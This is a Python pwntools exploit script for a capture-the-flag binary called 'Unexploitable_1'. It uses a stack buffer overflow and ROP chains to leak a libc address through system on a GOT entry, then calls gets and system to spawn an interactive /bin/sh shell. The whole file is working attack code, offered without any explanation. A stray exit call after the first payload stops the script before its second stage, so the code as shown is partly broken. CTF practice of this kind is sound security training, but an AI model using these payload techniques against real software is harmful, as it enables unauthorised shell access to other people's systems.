#!/usr/bin/python2
# bin: https://ctf.j0n9hyun.xyz/files/dd8c5e82fe2b268e59b029a0c46e1a52/Unexploitable_1

import sys
import code
import time
from pwn import *

context.arch='amd64'

target = './Unexploitable_1'
#p = remote('ctf.j0n9hyun.xyz',3023)
p = process(target)
e = ELF(target)
rop = ROP(e)

print(p.recv())
#input('attach gdb')

system = e.plt['system']
fgets_got = e.got['fgets']
stdin = e.sym['stdin']
bss = 0x601060
sh = b'/bin/sh\x00'

buff_size = 0x18

rop.raw(b'a'*buff_size)
rop.call('system',[fgets_got])
rop.call('main',[])
print('-] first payload')
p.sendline(rop.chain())
time.sleep(0.2)

print(p.recv(4096))
sys.exit(0)
print(p.recvuntil('sh: 1: '))
fgets_addr = unpack(p.recvuntil(':')[:-1], 'all', endian='little')
gets_addr = fgets_addr+0x12b0 # ubuntu 16.04
gets_addr = fgets_addr+0x1340 # ubuntu 20.04

print('fgets_addr: ', hex(fgets_addr))
print('gets_addr : ', hex(gets_addr))

e.sym['gets'] = gets_addr
rop = ROP(e)

rop.raw(b'a'*buff_size)
rop.call('gets',[bss])
rop.call('system',[bss])
print('=] second payload')
p.sendline(rop.chain())
time.sleep(0.2)
print('[*] send /bin/sh\x00')
p.sendline(b'/bin/sh\x00')
time.sleep(0.2)
print(p.recv())
p.interactive()
